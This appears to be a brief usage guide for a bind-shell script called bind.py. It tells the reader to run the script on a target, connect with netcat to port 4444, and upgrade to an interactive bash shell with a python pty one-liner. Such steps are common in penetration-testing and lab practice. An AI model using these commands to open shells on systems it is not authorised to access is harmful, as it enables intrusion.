1. Start bind.py on the target.
2. Connect using nc to target 

'''bash
nc targetip 4444
'''
3.Run the fallowing command on terminal 

'''bash
python -c 'import pty; pty.spawn("/bin/bash")'
'''
